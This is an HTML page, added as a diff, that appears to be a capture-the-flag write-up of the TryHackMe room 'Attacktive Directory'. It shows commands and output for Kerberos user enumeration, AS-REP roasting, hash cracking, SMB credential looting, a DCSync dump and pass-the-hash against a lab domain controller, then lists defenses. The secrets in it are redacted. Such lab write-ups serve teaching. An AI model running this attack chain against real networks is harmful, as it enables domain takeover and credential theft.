@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Attacktive Directory | JackHacksStuff</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --accent:     #ff6b35;
+    --accent-rgb: 255,107,53;
+    --bg:       #090b0e;
+    --surface:  #0e1116;
+    --surface2: #131820;
+    --border:   #1c2330;
+    --border2:  #26303f;
+    --blue:     #7b9cff;
+    --text:     #c5d4e8;
+    --muted:    #48586e;
+    --muted2:   #6b7f97;
+    --mono:     'IBM Plex Mono', monospace;
+    --sans:     'Syne', sans-serif;
+    --rail:     48px;
+    --content:  720px;
+  }
+
+  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--mono);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+    opacity: 0.025;
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  .rail {
+    position: fixed;
+    top: 0; left: 0;
+    width: var(--rail);
+    height: 100vh;
+    border-right: 1px solid var(--border);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 1.5rem 0;
+    z-index: 100;
+    background: var(--bg);
+  }
+
+  .rail-logo {
+    writing-mode: vertical-rl;
+    transform: rotate(180deg);
+    font-family: var(--sans);
+    font-weight: 800;
+    font-size: 0.7rem;
+    letter-spacing: 0.15em;
+    color: #fff;
+    white-space: nowrap;
+    text-decoration: none;
+    margin-bottom: auto;
+  }
+
+  .rail-logo span { color: var(--accent); }
+
+  .rail-toc {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 0;
+    margin: 2rem 0;
+    overflow: hidden;
+  }
+
+  .rail-line { width: 1px; flex: 1; background: var(--border); }
+
+  .rail-tick {
+    width: 6px; height: 1px;
+    background: var(--border2);
+    flex-shrink: 0;
+    transition: background 0.3s;
+    cursor: pointer;
+  }
+
+  .rail-tick.active { background: var(--accent); box-shadow: 0 0 8px var(--accent); }
+
+  .rail-bottom {
+    font-size: 0.6rem;
+    color: var(--muted);
+    writing-mode: vertical-rl;
+    transform: rotate(180deg);
+    letter-spacing: 0.1em;
+  }
+
+  main { margin-left: var(--rail); }
+
+  nav {
+    position: sticky;
+    top: 0; z-index: 90;
+    background: rgba(9,11,14,0.92);
+    backdrop-filter: blur(12px);
+    border-bottom: 1px solid var(--border);
+    padding: 0 3rem;
+    height: 56px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .nav-back {
+    font-size: 0.75rem;
+    color: var(--muted2);
+    text-decoration: none;
+    letter-spacing: 0.08em;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    transition: color 0.2s;
+  }
+
+  .nav-back:hover { color: var(--accent); }
+
+  .nav-meta {
+    font-size: 0.7rem;
+    color: var(--muted);
+    display: flex;
+    align-items: center;
+    gap: 1.5rem;
+  }
+
+  .nav-badge {
+    font-size: 0.6rem;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    padding: 0.15rem 0.5rem;
+    border: 1px solid var(--accent);
+    color: var(--accent);
+  }
+
+  .wu-header {
+    padding: 5rem 3rem 3.5rem;
+    border-bottom: 1px solid var(--border);
+    position: relative;
+    overflow: hidden;
+  }
+
+  .wu-header::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background-image:
+      linear-gradient(var(--border) 1px, transparent 1px),
+      linear-gradient(90deg, var(--border) 1px, transparent 1px);
+    background-size: 60px 60px;
+    opacity: 0.3;
+    mask-image: radial-gradient(ellipse 70% 100% at 90% 50%, black 0%, transparent 100%);
+  }
+
+  .wu-header::after {
+    content: '';
+    position: absolute;
+    bottom: -1px; left: 3rem;
+    width: 80px; height: 1px;
+    background: var(--accent);
+    box-shadow: 0 0 12px rgba(var(--accent-rgb), 0.6);
+  }
+
+  .wu-eyebrow {
+    font-size: 0.65rem;
+    letter-spacing: 0.3em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 1.25rem;
+    position: relative;
+  }
+
+  .wu-title {
+    font-family: var(--sans);
+    font-weight: 800;
+    font-size: clamp(2.5rem, 7vw, 5rem);
+    color: #fff;
+    line-height: 0.95;
+    letter-spacing: -0.02em;
+    position: relative;
+    margin-bottom: 2rem;
+  }
+
+  .wu-meta-row {
+    display: flex;
+    gap: 2rem;
+    flex-wrap: wrap;
+    position: relative;
+  }
+
+  .wu-meta-item {
+    display: flex;
+    flex-direction: column;
+    gap: 0.25rem;
+  }
+
+  .wu-meta-label {
+    font-size: 0.6rem;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--muted);
+  }
+
+  .wu-meta-value {
+    font-size: 0.8rem;
+    color: var(--text);
+  }
+
+  .wu-meta-value.accent { color: var(--accent); }
+
+  .tool-row {
+    display: flex;
+    gap: 0.4rem;
+    flex-wrap: wrap;
+    padding: 1.25rem 3rem;
+    border-bottom: 1px solid var(--border);
+    background: var(--surface);
+  }
+
+  .tool-tag {
+    font-size: 0.62rem;
+    letter-spacing: 0.06em;
+    color: var(--muted2);
+    background: var(--border);
+    padding: 0.2rem 0.5rem;
+  }
+
+  .wu-body {
+    max-width: calc(var(--content) + 6rem);
+    padding: 4rem 3rem;
+    margin: 0 auto;
+  }
+
+  .wu-body h2 {
+    font-family: var(--mono);
+    font-weight: 500;
+    font-size: 0.78rem;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin: 3rem 0 1.25rem;
+    padding-top: 3rem;
+    border-top: 1px solid var(--border);
+    scroll-margin-top: 80px;
+  }
+
+  .wu-body h2:first-child { margin-top: 0; padding-top: 0; border-top: none; }
+
+  .wu-body h3 {
+    font-family: var(--sans);
+    font-weight: 700;
+    font-size: 1rem;
+    color: #fff;
+    margin: 1.5rem 0 0.75rem;
+  }
+
+  .wu-body p {
+    font-size: 0.82rem;
+    color: var(--muted2);
+    line-height: 2;
+    margin-bottom: 1rem;
+  }
+
+  .wu-body p strong { color: var(--text); font-weight: 500; }
+  .wu-body p code {
+    background: var(--surface);
+    color: var(--accent);
+    padding: 0.1em 0.35em;
+    font-size: 0.85em;
+    border: 1px solid var(--border);
+  }
+
+  .wu-body ol, .wu-body ul {
+    font-size: 0.82rem;
+    color: var(--muted2);
+    line-height: 2;
+    margin-bottom: 1rem;
+    padding-left: 1.5rem;
+  }
+
+  .wu-body ol li, .wu-body ul li {
+    margin-bottom: 0.5rem;
+  }
+
+  .wu-body ol li strong, .wu-body ul li strong {
+    color: var(--text);
+    font-weight: 500;
+  }
+
+  .wu-body ol code, .wu-body ul code {
+    background: var(--surface);
+    color: var(--accent);
+    padding: 0.1em 0.35em;
+    font-size: 0.85em;
+    border: 1px solid var(--border);
+  }
+
+  .wu-body pre {
+    background: var(--surface);
+    border-left: 2px solid var(--accent);
+    padding: 1rem 1.25rem;
+    overflow-x: auto;
+    margin: 1rem 0;
+    font-size: 0.76rem;
+    line-height: 1.7;
+    color: var(--text);
+  }
+
+  .wu-body pre code {
+    background: none;
+    padding: 0;
+    color: inherit;
+    border: none;
+    font-size: inherit;
+  }
+
+  .flag-box {
+    background: var(--surface);
+    border: 1px solid var(--accent);
+    padding: 0.85rem 1.25rem;
+    margin: 1.25rem 0;
+    display: flex;
+    flex-direction: column;
+    gap: 0.3rem;
+  }
+
+  .flag-box .flag-label {
+    font-size: 0.62rem;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--muted);
+  }
+
+  .flag-box .flag-value {
+    color: var(--accent);
+    font-size: 0.82rem;
+    word-break: break-all;
+  }
+
+  .takeaway {
+    background: rgba(var(--accent-rgb), 0.04);
+    border-left: 2px solid var(--accent);
+    padding: 0.85rem 1.1rem;
+    margin: 1rem 0;
+    font-size: 0.8rem;
+    color: var(--muted2);
+    line-height: 1.8;
+  }
+
+  .takeaway strong { color: var(--text); font-weight: 500; }
+
+  .note {
+    background: rgba(123,156,255,0.04);
+    border-left: 2px solid var(--blue);
+    padding: 0.85rem 1.1rem;
+    margin: 1rem 0;
+    font-size: 0.8rem;
+    color: var(--muted2);
+    line-height: 1.8;
+  }
+
+  .note strong { color: #9fb8ff; font-weight: 500; }
+
+  .wu-footer {
+    border-top: 1px solid var(--border);
+    margin: 0 3rem;
+    padding: 2.5rem 0;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 1rem;
+  }
+
+  .footer-nav-link {
+    display: flex;
+    flex-direction: column;
+    gap: 0.3rem;
+    text-decoration: none;
+    max-width: 220px;
+  }
+
+  .footer-nav-label {
+    font-size: 0.62rem;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--muted);
+  }
+
+  .footer-nav-title {
+    font-family: var(--sans);
+    font-weight: 700;
+    font-size: 0.9rem;
+    color: var(--muted2);
+    transition: color 0.2s;
+  }
+
+  .footer-nav-link:hover .footer-nav-title { color: var(--accent); }
+
+  .footer-nav-link.next { text-align: right; }
+
+  .footer-center {
+    font-size: 0.7rem;
+    color: var(--muted);
+  }
+
+  .footer-center a {
+    color: var(--muted2);
+    text-decoration: none;
+    transition: color 0.2s;
+  }
+
+  .footer-center a:hover { color: var(--accent); }
+
+  @media (max-width: 768px) {
+    :root { --rail: 0px; }
+    .rail { display: none; }
+    main { margin-left: 0; }
+    nav, .wu-header, .tool-row { padding-left: 1.5rem; padding-right: 1.5rem; }
+    .wu-body { padding: 2.5rem 1.5rem; }
+    .wu-footer { margin: 0 1.5rem; }
+    .wu-title { font-size: 2.5rem; }
+  }
+</style>
+</head>
+<body>
+
+<div class="rail">
+  <a class="rail-logo" href="../index.html">Jack<span>Hacks</span>Stuff</a>
+  <div class="rail-toc" id="railToc">
+    <div class="rail-line"></div>
+    <div class="rail-tick active" data-heading="overview"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="recon"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="enum"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="asreproast"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="smb-enum"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="dcsync"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="pth"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="flags"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="takeaways"></div>
+    <div class="rail-line"></div>
+  </div>
+  <div class="rail-bottom">Medium</div>
+</div>
+
+<main>
+  <nav>
+    <a href="../writeups.html" class="nav-back">← Write-ups</a>
+    <div class="nav-meta">
+      <span>TryHackMe</span>
+      <span class="nav-badge">Medium</span>
+    </div>
+  </nav>
+
+  <div class="wu-header">
+    <div class="wu-eyebrow">// TryHackMe · active directory · kerberos attacks</div>
+    <h1 class="wu-title">Attacktive Directory</h1>
+    <div class="wu-meta-row">
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Date</span>
+        <span class="wu-meta-value">2026-07-22</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Difficulty</span>
+        <span class="wu-meta-value accent">Medium</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Flags</span>
+        <span class="wu-meta-value">3</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Platform</span>
+        <span class="wu-meta-value">TryHackMe</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="tool-row">
+    <span class="tool-tag">nmap</span>
+    <span class="tool-tag">enum4linux-ng</span>
+    <span class="tool-tag">kerbrute</span>
+    <span class="tool-tag">GetNPUsers.py</span>
+    <span class="tool-tag">hashcat</span>
+    <span class="tool-tag">smbclient</span>
+    <span class="tool-tag">secretsdump.py</span>
+    <span class="tool-tag">evil-winrm</span>
+  </div>
+
+  <div class="wu-body">
+
+    <h2 id="overview">// Overview</h2>
+    <p><strong>Attacktive Directory</strong> is a TryHackMe room that introduces common Active Directory enumeration and attack techniques. The room simulates a domain environment with several misconfigurations that let an attacker move from no knowledge to complete domain compromise.</p>
+    <p>The attack chain includes:</p>
+    <ul>
+      <li>Port scanning and service enumeration (SMB, LDAP)</li>
+      <li>Kerberos user enumeration with Kerbrute</li>
+      <li>AS-REP Roasting to extract and crack a service account hash</li>
+      <li>SMB share enumeration to find backup credentials</li>
+      <li>DCSync attack to dump the NTDS.dit database</li>
+      <li>Pass-the-Hash to authenticate as Domain Administrator</li>
+    </ul>
+
+    <h2 id="recon">// Phase 1: Reconnaissance</h2>
+
+    <p>We begin with an Nmap scan targeting ports 139 and 445 (SMB). Later, we conduct a full port scan.</p>
+
+    <pre>nmap -sC -sV -p139,445 &lt;target_ip&gt;</pre>
+
+    <p>The scan shows that SMB and NetBIOS services running, with SMB signing enabled and required:</p>
+
+    <pre>PORT    STATE SERVICE       VERSION
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required</pre>
+
+    <p>We also check for LDAP services, which are critical for Active Directory enumeration:</p>
+
+    <pre>nmap -p389,636 &lt;target_ip&gt;</pre>
+
+    <p>LDAP is open on port 389, confirming that this is a Domain Controller.</p>
+
+    <div class="note">
+      <strong>Pro Tip:</strong> When SMB signing is marked as "required," we can't relay SMB authentication. However, we can still perform enumeration and use other attack methods like Kerberos.
+    </div>
+
+    <h2 id="enum">// Phase 2: Domain Enumeration</h2>
+
+    <p>We use <code>enum4linux-ng</code>, the Python rewrite, to gather domain information:</p>
+
+    <pre>enum4linux-ng -A &lt;target_ip&gt;</pre>
+
+    <p>Here are the key findings from the enumeration:</p>
+
+    <ul>
+      <li><strong>Long domain name:</strong> <code>spookysec.local</code></li>
+      <li><strong>NetBIOS domain name:</strong> <code>THM-AD</code></li>
+      <li><strong>Domain SID:</strong> <code>S-1-5-21-3591857110-2884097990-301047963</code></li>
+      <li><strong>Anonymous SMB session:</strong> Allowed (null session)</li>
+    </ul>
+
+    <pre>[+] Found domain information via SMB
+NetBIOS computer name: ATTACKTIVEDIREC
+NetBIOS domain name: THM-AD
+DNS domain: spookysec.local
+FQDN: AttacktiveDirectory.spookysec.local</pre>
+
+    <div class="takeaway">
+      <strong>Null sessions are dangerous.</strong> The server allows authentication with an empty username and password; this can be used for further enumeration.
+    </div>
+
+    <h2 id="asreproast">// Phase 3: AS-REP Roasting</h2>
+
+    <p>With the domain name identified, we use <code>kerbrute</code> to find valid usernames via Kerberos:</p>
+
+    <pre>kerbrute userenum --dc &lt;target_ip&gt; -d spookysec.local userlist.txt</pre>
+
+    <p>Kerbrute discovers 16 valid users, including several that stand out:</p>
+
+    <pre>[+] VALID USERNAME:	 svc-admin@spookysec.local
+[+] VALID USERNAME:	 backup@spookysec.local
+[+] VALID USERNAME:	 administrator@spookysec.local</pre>
+
+    <p>We then use <code>GetNPUsers.py</code> from Impacket to request AS-REP tickets for users with the <strong>"Do not require Kerberos preauthentication"</strong> flag set:</p>
+
+    <pre>GetNPUsers.py spookysec.local/svc-admin -dc-ip &lt;target_ip&gt;</pre>
+
+    <p>The tool returns an AS-REP hash for the <code>svc-admin</code> account:</p>
+
+    <pre>$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:[HASH_REDACTED]</pre>
+
+    <p>We save this hash to a file and crack it with <code>hashcat</code> using mode 18200 (Kerberos 5 AS-REP etype 23):</p>
+
+    <pre>hashcat -m 18200 hash.txt passwordlist.txt</pre>
+
+    <p>Hashcat cracks the password using the provided wordlist. We now have valid credentials for the <code>svc-admin</code> account.</p>
+
+    <div class="takeaway">
+      <strong>Service accounts are prime targets.</strong> They often have weak passwords and misconfigurations, such as disabled preauthentication. Always check for accounts with <code>UF_DONT_REQUIRE_PREAUTH</code>.
+    </div>
+
+    <h2 id="smb-enum">// Phase 4: SMB Share Enumeration</h2>
+
+    <p>With the <code>svc-admin</code> credentials, we list SMB shares:</p>
+
+    <pre>smbclient -L //&lt;target_ip&gt; -U svc-admin</pre>
+
+    <p>The share listing reveals several shares, including a custom <code>backup</code> share:</p>
+
+    <pre>Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+backup          Disk      
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+NETLOGON        Disk      Logon server share 
+SYSVOL          Disk      Logon server share</pre>
+
+    <p>We connect to the <code>backup</code> share and check its contents:</p>
+
+    <pre>smbclient //&lt;target_ip&gt;/backup -U svc-admin</pre>
+
+    <pre>smb: \> ls
+  .                                   D        0  Sat Apr  4 19:08:39 2020
+  ..                                  D        0  Sat Apr  4 19:08:39 2020
+  backup_credentials.txt              A       48  Sat Apr  4 19:08:53 2020</pre>
+
+    <p>We download the file:</p>
+
+    <pre>smb: \> get backup_credentials.txt</pre>
+
+    <p>The file contains base64-encoded credentials. Decoding them reveals a username and password for the <code>backup</code> account.</p>
+
+    <p>Now, we have a second set of credentials for the <code>backup</code> account.</p>
+
+    <div class="takeaway">
+      <strong>SMB shares often hold sensitive information.</strong> Always explore shares carefully with any credentials you have.
+    </div>
+
+    <h2 id="dcsync">// Phase 5: DCSync Attack</h2>
+
+    <p>With the <code>backup</code> account credentials, we try to dump the NTDS.dit database using <code>secretsdump.py</code>:</p>
+
+    <pre>secretsdump.py spookysec.local/backup:[PASSWORD_REDACTED]@&lt;target_ip&gt;</pre>
+
+    <p>The tool uses the DRSUAPI method (DCSync) to replicate directory changes from the Domain Controller:</p>
+
+    <pre>[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH_REDACTED]
+Guest:501:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH_REDACTED]
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH_REDACTED]
+...
+spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH_REDACTED]
+spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH_REDACTED]</pre>
+
+    <div class="note">
+      <strong>DCSync:</strong> This attack works because the <code>backup</code> account probably has <code>Replicating Directory Changes</code> permissions; this is common for Backup Operators. We do not need local access to the DC, as it all happens over the network.
+    </div>
+
+    <h2 id="pth">// Phase 6: Pass-the-Hash</h2>
+
+    <p>We have the Administrator's NTLM hash from the DCSync dump. By using <code>evil-winrm</code> with the <code>-H</code> flag, we can authenticate without needing the plaintext password:</p>
+
+    <pre>evil-winrm -i &lt;target_ip&gt; -u Administrator -H [NTLM_HASH_REDACTED]</pre>
+
+    <p>This gives us an interactive PowerShell session as the Domain Administrator:</p>
+
+    <pre>Evil-WinRM shell v3.9
+                                        
+Info: Establishing connection to remote endpoint
+PS C:\Users\Administrator\Documents></pre>
+
+    <div class="takeaway">
+      <strong>Pass-the-Hash is highly effective.</strong> Once you have an NTLM hash, there's no need to crack it. You can authenticate directly using the hash with many tools.
+    </div>
+
+    <h2 id="flags">// Phase 7: Flags</h2>
+
+    <p>We now have full access to the system. We retrieve all three flags from each user's desktop:</p>
+
+    <pre>PS C:\Users\Administrator\Documents> type C:\Users\svc-admin\Desktop\user.txt.txt
+
+PS C:\Users\Administrator\Documents> type C:\Users\backup\Desktop\PrivEsc.txt
+
+PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt</pre>
+
+    <div class="flag-box">
+      <span class="flag-label">svc-admin Flag</span>
+      <span class="flag-value">TryHackMe{K3rb...}</span>
+    </div>
+
+    <div class="flag-box">
+      <span class="flag-label">backup Flag</span>
+      <span class="flag-value">TryHackMe{B4ck...}</span>
+    </div>
+
+    <div class="flag-box">
+      <span class="flag-label">Administrator Flag</span>
+      <span class="flag-value">TryHackMe{4cti...}</span>
+    </div>
+
+    <h2 id="takeaways">// Key Takeaways</h2>
+
+    <div class="takeaway">
+      <strong>Kerberos attacks are very effective.</strong> AS-REP Roasting and Kerberoasting are great methods to extract service account hashes without needing any credentials.
+    </div>
+
+    <div class="takeaway">
+      <strong>Permissions are more important than passwords.</strong> The <code>backup</code> account lacked admin rights, but its DCSync permissions let us compromise the entire domain.
+    </div>
+
+    <div class="takeaway">
+      <strong>Chain your exploits.</strong> Each step provided us with something useful for the next: credentials, then SMB access, leading to more credentials, then DCSync, and finally complete compromise.
+    </div>
+
+    <div class="takeaway">
+      <strong>Defense in depth is essential.</strong> To protect against this attack chain, organizations should:
+      <ul>
+        <li>Disable Kerberos preauthentication only when absolutely necessary</li>
+        <li>Restrict DCSync permissions to Domain Admins only</li>
+        <li>Use strong, unique passwords for service accounts</li>
+        <li>Monitor for unusual Kerberos activity (Event ID 4768 with status 0x6/0x12)</li>
+        <li>Enable Credential Guard on Windows 10/Server 2016 and newer</li>
+      </ul>
+    </div>
+
+    <div class="takeaway">
+      <strong>Active Directory is complicated.</strong> There are many ways to move laterally and gain higher privileges. Tools like BloodHound can help visualize these attack paths.
+    </div>
+
+  </div>
+
+  <div class="wu-footer">
+    <div class="footer-center">
+      <a href="../writeups.html">All write-ups</a>
+    </div>
+    <a href="daily-bugle.html" class="footer-nav-link next">
+      <span class="footer-nav-label">Next →</span>
+      <span class="footer-nav-title">Daily Bugle</span>
+    </a>
+  </div>
+
+</main>
+
+<script>
+  const headings = document.querySelectorAll('.wu-body h2[id]');
+  const ticks = document.querySelectorAll('.rail-tick[data-heading]');
+
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        const id = entry.target.id;
+        ticks.forEach(t => t.classList.toggle('active', t.dataset.heading === id));
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+
+  headings.forEach(h => observer.observe(h));
+
+  ticks.forEach(tick => {
+    tick.addEventListener('click', () => {
+      const target = document.getElementById(tick.dataset.heading);
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
+</body>
+</html>
